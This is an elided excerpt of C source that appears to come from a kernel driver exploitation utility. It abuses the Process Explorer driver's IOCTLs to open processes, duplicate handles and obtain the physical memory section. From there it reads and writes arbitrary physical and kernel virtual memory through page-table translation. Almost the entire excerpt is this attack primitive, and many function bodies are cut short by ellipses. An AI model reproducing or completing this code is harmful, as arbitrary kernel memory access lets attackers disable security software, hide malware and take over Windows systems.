...
static KDU_VICTIM_PROVIDER g_ProcExpVictimSelf{
    ...
    SYNCHRONIZE | GENERIC_READ |
        GENERIC_WRITE,  // Desired access flags used for acquiring victim handle
...
#define PexpMapMemory(PhysicalAddress, NumberOfBytes, MapForWrite)    \
    supMapPhysicalMemory(g_PexPhysicalMemorySection, PhysicalAddress, \
 ...
 *
 */
BOOL WINAPI PexpReadWritePhysicalMemory(_In_ ULONG_PTR PhysicalAddress,
                                        _In_reads_bytes_(NumberOfBytes)
                                            PVOID Buffer,
                                        _In_ ULONG NumberOfBytes,
                                        _In_ BOOLEAN DoWrite) {
    return supReadWritePhysicalMemory(g_PexPhysicalMemorySection,
                                      PhysicalAddress, Buffer, NumberOfBytes,
                                      DoWrite);
}
 ...
 *
 */
BOOL WINAPI PexReadPhysicalMemory(_In_ HANDLE DeviceHandle,
                                  _In_ ULONG_PTR PhysicalAddress,
                                  _In_ PVOID Buffer,
                                  _In_ ULONG NumberOfBytes) {
    UNREFERENCED_PARAMETER(DeviceHandle);

    return PexpReadWritePhysicalMemory(PhysicalAddress, Buffer, NumberOfBytes,
                                       FALSE);
}
 ...
 *
 */
BOOL WINAPI PexWritePhysicalMemory(_In_ HANDLE DeviceHandle,
                                   _In_ ULONG_PTR PhysicalAddress,
 ...
 *
 */
BOOL WINAPI PexQueryPML4Value(_In_ HANDLE DeviceHandle,
    ...
    *Value = 0;
    ...
    pbLowStub1M = (ULONG_PTR)PexpMapMemory(0ULL, cbRead, FALSE);
 ...
 *
 */
BOOL WINAPI PexVirtualToPhysical(_In_ HANDLE DeviceHandle,
                                 _In_ ULONG_PTR VirtualAddress,
                                 _Out_ ULONG_PTR* PhysicalAddress) {
    return PwVirtualToPhysical(DeviceHandle, PexQueryPML4Value,
                               PexReadPhysicalMemory, VirtualAddress,
                               PhysicalAddress);
}
 ...
 *
 */
BOOL WINAPI PexReadKernelVirtualMemory(_In_ HANDLE DeviceHandle,
    ...
    bResult = PexVirtualToPhysical(DeviceHandle, Address, &physicalAddress);

    if (bResult) {
        bResult = PexpReadWritePhysicalMemory(physicalAddress, Buffer,
                                              NumberOfBytes, FALSE);
    }
 ...
 *
 */
BOOL WINAPI PexWriteKernelVirtualMemory(_In_ HANDLE DeviceHandle,
                                        _In_ ULONG_PTR Address,
                                        _In_reads_bytes_(NumberOfBytes)
                                            PVOID Buffer,
                                        _In_ ULONG NumberOfBytes) {
 ...
 *
 */
BOOL PexpDuplicateHandle(_In_ HANDLE DeviceHandle,
    ...
    *TargetHandle = NULL;
    ...
    return supCallDriver(DeviceHandle, IOCTL_PROCEXP_DUPLICATE_HANDLE, &request,
 ...
 *
 */
BOOL WINAPI PexOpenProcess(_In_ HANDLE DeviceHandle,
    ...
    *ProcessHandle = NULL;
    ...
    return supCallDriver(DeviceHandle, IOCTL_PROCEXP_OPEN_PROCESS,
                         (PVOID)&ProcessId, sizeof(ProcessId), ProcessHandle,
                         sizeof(PVOID));
}
 ...
 *
 */
BOOL WINAPI PexRegisterDriver(_In_ HANDLE DeviceHandle, _In_opt_ PVOID Param) {
    ...
    return supOpenPhysicalMemory(DeviceHandle, PexOpenProcess,
                                 PexpDuplicateHandle,
 ...
 *
 */
BOOL WINAPI PexpUnregisterDriver(_In_ HANDLE DeviceHandle) {
    UNREFERENCED_PARAMETER(DeviceHandle);
